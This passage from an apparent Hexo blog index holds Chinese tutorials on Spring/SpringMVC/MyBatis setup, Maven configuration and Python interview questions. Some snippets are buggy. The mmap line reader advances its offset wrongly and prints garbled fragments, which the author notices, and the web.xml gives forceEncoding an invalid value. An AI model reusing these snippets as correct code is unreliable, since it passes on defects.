/plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">package com.ssmdeom.service;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import com.ssmdeom.dao.StudentDao;</span><br><span class="line">import com.ssmdeom.entity.Student;</span><br><span class="line">import org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line">import org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line">import java.util.List;</span><br><span class="line"></span><br><span class="line">@Service</span><br><span class="line">public class StudentServiceImpl implements StudentService &#123;</span><br><span class="line"></span><br><span class="line">    @Autowired</span><br><span class="line">    StudentDao studentDao;</span><br><span class="line"></span><br><span class="line">    public Student searchStudentId(int id) &#123;</span><br><span class="line">        return studentDao.searchStudentId(id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public List&lt;Student&gt; listStudent() &#123;</span><br><span class="line">        return studentDao.listStudent();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="4-6在controller下面创建StudentController"><a href="#4-6在controller下面创建StudentController" class="headerlink" title="4.6在controller下面创建StudentController"></a>4.6在controller下面创建StudentController</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">package com.ssmdeom.controller;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import com.ssmdeom.entity.Student;</span><br><span class="line">import com.ssmdeom.service.StudentService;</span><br><span class="line">import org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line">import org.springframework.stereotype.Controller;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line">import org.springframework.web.servlet.ModelAndView;</span><br><span class="line"></span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line">import java.util.List;</span><br><span class="line"></span><br><span class="line">@Controller</span><br><span class="line">@RequestMapping(&quot;&quot;)</span><br><span class="line">public class StudentController &#123;</span><br><span class="line"></span><br><span class="line">    @Autowired</span><br><span class="line">    private StudentService studentService;</span><br><span class="line"></span><br><span class="line">    @RequestMapping(&quot;/all&quot;)</span><br><span class="line">    public String listStudent(HttpServletRequest request, HttpServletResponse response) &#123;</span><br><span class="line">        List&lt;Student&gt; students = studentService.listStudent();</span><br><span class="line">        request.setAttribute(&quot;students&quot;,students);</span><br><span class="line">        return &quot;liststudents&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @RequestMapping(&quot;/student&quot;)</span><br><span class="line">    public ModelAndView getstudent(int id) &#123;</span><br><span class="line">        ModelAndView mav = new ModelAndView(&quot;student&quot;);</span><br><span class="line">        Student studentid = studentService.searchStudentId(id);</span><br><span class="line">        mav.addObject(&quot;student&quot;,studentid);</span><br><span class="line">        return  mav;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Idea搭建 Maven+SSM（Spring+SpringMVC+MyBatis）</title>
      <link href="/2019/04/01/shi-yong-idea-da-jian-maven-ssm-spring-springmvc-mybatis/"/>
      <url>/2019/04/01/shi-yong-idea-da-jian-maven-ssm-spring-springmvc-mybatis/</url>
      
        <content type="html"><![CDATA[<h1 id="使用Idea搭建-Maven-SSM（Spring-SpringMVC-MyBatis）"><a href="#使用Idea搭建-Maven-SSM（Spring-SpringMVC-MyBatis）" class="headerlink" title="使用Idea搭建 Maven+SSM（Spring+SpringMVC+MyBatis）"></a>使用Idea搭建 Maven+SSM（Spring+SpringMVC+MyBatis）</h1><h2 id="1-创建项目"><a href="#1-创建项目" class="headerlink" title="1.创建项目"></a>1.创建项目</h2><p>创建Maven项目  选择为webapp，等待加载完项目。</p><h2 id="2-修改pom-xml"><a href="#2-修改pom-xml" class="headerlink" title="2.修改pom.xml"></a>2.修改pom.xml</h2><p> <a href="https://mvnrepository.com/" target="_blank" rel="noopener">Maven Repository: Search/Browse/Explore</a><br>选择里面的包贴到pom.xml中，程序会自己下载包</p><h2 id="3-构造目录"><a href="#3-构造目录" class="headerlink" title="3.构造目录"></a>3.构造目录</h2><p>在main目录下创建文件夹<br>java/com/java/xxxx<br>修改java属性为resource root</p><h2 id="4-修改web-xml"><a href="#4-修改web-xml" class="headerlink" title="4.修改web.xml"></a>4.修改web.xml</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE web-app PUBLIC</span></span><br><span class="line"><span class="meta"> "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"</span></span><br><span class="line"><span class="meta"> "http://java.sun.com/dtd/web-app_2_3.dtd" &gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--1.针对spring配置：读取配置文件--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>WEB-INF/spring/applicationContext.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!--注册servletcontext监听器，并且将applicationcontext对象放到application域中--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springmvc<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>WEB-INF/spring/applicationContext.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springmvc<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>*.do<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>encoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>utf-8<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>forceEncoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h2 id="5-创建applicationContext-xml"><a href="#5-创建applicationContext-xml" class="headerlink" title="5.创建applicationContext.xml"></a>5.创建applicationContext.xml</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Maven</title>
      <link href="/2019/03/13/maven/"/>
      <url>/2019/03/13/maven/</url>
      
        <content type="html"><![CDATA[<h1 id="Maven"><a href="#Maven" class="headerlink" title="Maven"></a>Maven</h1><h2 id="什么是Maven"><a href="#什么是Maven" class="headerlink" title="什么是Maven"></a>什么是Maven</h2><blockquote><h3 id="Maven-是项目构建工具，能把项目抽象成-POM-project-object-model-Maven-使用-POM对项目进行构建、打包、文档化等操作。最重要的是解决了项目需要类库的依赖管理，简化了项目开发环境搭建的过程。"><a href="#Maven-是项目构建工具，能把项目抽象成-POM-project-object-model-Maven-使用-POM对项目进行构建、打包、文档化等操作。最重要的是解决了项目需要类库的依赖管理，简化了项目开发环境搭建的过程。" class="headerlink" title="Maven 是项目构建工具，能把项目抽象成 POM (project object model), Maven 使用 POM对项目进行构建、打包、文档化等操作。最重要的是解决了项目需要类库的依赖管理，简化了项目开发环境搭建的过程。"></a>Maven 是项目构建工具，能把项目抽象成 POM (project object model), Maven 使用 POM对项目进行构建、打包、文档化等操作。最重要的是解决了项目需要类库的依赖管理，简化了项目开发环境搭建的过程。</h3></blockquote><h4 id="这个就很像我们学习Django中的django-admin相似，但是有缺少库管理。这样应该就更能理解了。"><a href="#这个就很像我们学习Django中的django-admin相似，但是有缺少库管理。这样应该就更能理解了。" class="headerlink" title="这个就很像我们学习Django中的django-admin相似，但是有缺少库管理。这样应该就更能理解了。"></a>这个就很像我们学习Django中的django-admin相似，但是有缺少库管理。这样应该就更能理解了。</h4><h2 id="安装Maven"><a href="#安装Maven" class="headerlink" title="安装Maven"></a>安装Maven</h2><h4 id="下载链接：Maven"><a href="#下载链接：Maven" class="headerlink" title="下载链接：Maven"></a>下载链接：<a href="http://maven.apache.org/" target="_blank" rel="noopener">Maven</a></h4><h4 id="阿里云的Maven镜像"><a href="#阿里云的Maven镜像" class="headerlink" title="阿里云的Maven镜像"></a>阿里云的<a href="https://maven.aliyun.com/mvn/view" target="_blank" rel="noopener">Maven镜像</a></h4><h4 id="1-解压到电脑的任意位置。"><a href="#1-解压到电脑的任意位置。" class="headerlink" title="1.解压到电脑的任意位置。"></a>1.解压到电脑的任意位置。</h4><h4 id="2-修改settings"><a href="#2-修改settings" class="headerlink" title="2.修改settings"></a>2.修改settings</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">localRepository</span>&gt;</span>path<span class="tag">&lt;/<span class="name">localRepository</span>&gt;</span>   // maven目录下创建一个repository</span><br><span class="line">// 修改maven的源</span><br><span class="line"><span class="tag">&lt;<span class="name">mirrors</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">id</span>&gt;</span>alimaven<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">name</span>&gt;</span>aliyun maven<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.aliyun.com/nexus/content/groups/public/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span>        </span><br><span class="line">    <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">mirrors</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h4 id="3-设置环境变量-将Maven目录下的bin设置到path中"><a href="#3-设置环境变量-将Maven目录下的bin设置到path中" class="headerlink" title="3.设置环境变量(将Maven目录下的bin设置到path中)"></a>3.设置环境变量(将Maven目录下的bin设置到path中)</h4><h4 id="4-测试是否成功"><a href="#4-测试是否成功" class="headerlink" title="4.测试是否成功"></a>4.测试是否成功</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ mvn -version</span><br><span class="line">Apache Maven 3.6.0 (97c98ec64a1fdfee7767ce5ffb20918da4f719f3; 2018-10-25T02:41:47+08:00)</span><br><span class="line">Maven home: D:\xxxxxxx\xxxx</span><br><span class="line">Java version: 1.8.0_201, vendor: Oracle Corporation, runtime: C:\Program Files\Java\jre1.8.0_201</span><br><span class="line">Default locale: zh_CN, platform encoding: GBK</span><br><span class="line">OS name: <span class="string">"xxxxxx"</span>, version: <span class="string">"xxx"</span>, arch: <span class="string">"xxx"</span>, family: <span class="string">"xxxxx"</span></span><br></pre></td></tr></table></figure></div><h2 id="学习资料"><a href="#学习资料" class="headerlink" title="学习资料"></a>学习资料</h2><h3 id="maven-一-maven到底是个啥玩意"><a href="#maven-一-maven到底是个啥玩意" class="headerlink" title="maven(一) maven到底是个啥玩意~"></a><a href="https://www.cnblogs.com/whgk/p/7112560.html" target="_blank" rel="noopener">maven(一) maven到底是个啥玩意~</a></h3>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python面试题-基础篇</title>
      <link href="/2019/03/11/python-mian-shi-ti-ji-chu-pian/"/>
      <url>/2019/03/11/python-mian-shi-ti-ji-chu-pian/</url>
      
        <content type="html"><![CDATA[<h1 id="Python面试题-基础篇"><a href="#Python面试题-基础篇" class="headerlink" title="Python面试题-基础篇"></a>Python面试题-基础篇</h1><h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><p>1.有一个jsonline格式的文件file.txt大小约为10K</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_lines</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'file.txt'</span>,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.readlines()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">for</span> e <span class="keyword">in</span> get_lines():</span><br><span class="line">        process(e) <span class="comment"># 处理每一行数据</span></span><br></pre></td></tr></table></figure></div><p> 现在要处理一个大小为10G的文件，但是内存只有4G，如果在只修改get_lines 函数而其他代码保持不变的情况下，应该如何实现？需要考虑的问题都有那些？</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_lines</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'file.txt'</span>,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">            <span class="keyword">yield</span> i</span><br></pre></td></tr></table></figure></div><p>因为内存只有4G，无法一次性读取10G文件，需要分批读取内容。每次读取内容的同时需要记录读取的位置，不然每次readline时，又是从第一行开始读取。</p><blockquote><p> <a href="yield.md">yield</a>生成器<br>  <a href="mmap.md">mmap</a>系统内存映射函数接口</p></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> mmap <span class="keyword">import</span> mmap</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_lines</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(filename,<span class="string">'r+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        m = mmap(f.fileno(),<span class="number">0</span>)</span><br><span class="line">        tmp = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i,char <span class="keyword">in</span> enumerate(m):</span><br><span class="line">            <span class="keyword">if</span> char == <span class="string">"\n"</span>:</span><br><span class="line">                <span class="keyword">yield</span> m[tmp:i+<span class="number">1</span>].decode()</span><br><span class="line">                tmp = tmp+<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> get_lines(<span class="string">"mmap_test.txt"</span>):</span><br><span class="line">        <span class="keyword">print</span> i</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def get_lines():</span><br><span class="line"></span><br><span class="line">ef get_lines():</span><br><span class="line">    with open(&apos;file.txt&apos;,&apos;rb&apos;) as f:</span><br><span class="line"></span><br><span class="line">f get_lines():</span><br><span class="line">    with open(&apos;file.txt&apos;,&apos;rb&apos;) as f:</span><br><span class="line">        for i in f:</span><br></pre></td></tr></table></figure></div><h4 id="mmap-test-txt"><a href="#mmap-test-txt" class="headerlink" title="mmap_test.txt"></a>mmap_test.txt</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def get_lines():</span><br><span class="line">    with open(&apos;file.txt&apos;,&apos;rb&apos;) as f:</span><br><span class="line">        for i in f:</span><br><span class="line">            yield i</span><br></pre></td></tr></table></figure></div><p> 似乎使用mmap并不是特别好使，这样确实可以记录读取到行。似乎对tab比较多的并友好。</p><h3 id="2-补充缺失的代码"><a href="#2-补充缺失的代码" class="headerlink" title="2.补充缺失的代码"></a>2.补充缺失的代码</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">sPath = os.getcwd()</span><br><span class="line"><span class="keyword">print</span> sPath</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_directory_contents</span><span class="params">(sPath)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> all_data <span class="keyword">in</span> os.listdir(sPath):</span><br><span class="line">        files_path = os.path.join(sPath,all_data)</span><br><span class="line">        <span class="keyword">if</span> os.path.isdir(files_path):</span><br><span class="line">            print_directory_contents(files_path)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> files_path</span><br></pre></td></tr></table></figure></div><h3 id="3-输入日期，-判断这一天是这一年的第几天？"><a href="#3-输入日期，-判断这一天是这一年的第几天？" class="headerlink" title="3.输入日期， 判断这一天是这一年的第几天？"></a>3.输入日期， 判断这一天是这一年的第几天？</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dayofyear</span><span class="params">()</span>:</span></span><br><span class="line">    year = raw_input(<span class="string">"请输入年份: "</span>)</span><br><span class="line">    month = raw_input(<span class="string">"请输入月份: "</span>)</span><br><span class="line">    day = raw_input(<span class="string">"请输入天: "</span>)</span><br><span class="line">    date1 = datetime.date(year=int(year),month=int(month),day=int(day))</span><br><span class="line">    date2 = datetime.date(year=int(year),month=<span class="number">1</span>,day=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">print</span> (date1-date2).days+<span class="number">1</span></span><br><span class="line">dayofyear()</span><br></pre></td></tr></table></figure></div><h3 id="4-打乱一个排好序的list对象alist？"><a href="#4-打乱一个排好序的list对象alist？" class="headerlink" title="4.打乱一个排好序的list对象alist？"></a>4.打乱一个排好序的list对象alist？</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">alist = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">random.shuffle(alist)</span><br><span class="line"><span class="keyword">print</span> alist</span><br></pre></td></tr></table></figure></div><h3 id="5-现有字典-d-‘a’-24-’g’-52-’i’-12-’k’-33-请按value值进行排序"><a href="#5-现有字典-d-‘a’-24-’g’-52-’i’-12-’k’-33-请按value值进行排序" class="headerlink" title="5.现有字典 d= {‘a’:24,’g’:52,’i’:12,’k’:33}请按value值进行排序?"></a>5.现有字典 d= {‘a’:24,’g’:52,’i’:12,’k’:33}请按value值进行排序?</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">d= &#123;<span class="string">'a'</span>:<span class="number">24</span>,<span class="string">'g'</span>:<span class="number">52</span>,<span class="string">'i'</span>:<span class="number">12</span>,<span class="string">'k'</span>:<span class="number">33</span>&#125;</span><br><span class="line">a = d.items()</span><br><span class="line"><span class="keyword">print</span> a</span><br><span class="line">f = <span class="keyword">lambda</span> x:x[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">print</span> f(a)</span><br><span class="line">b = sorted(d.items(),key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">print</span> b</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[(<span class="string">'a'</span>, 24), (<span class="string">'i'</span>, 12), (<span class="string">'k'</span>, 33), (<span class="string">'g'</span>, 52)]</span><br><span class="line">(<span class="string">'i'</span>, 12)</span><br><span class="line">[(<span 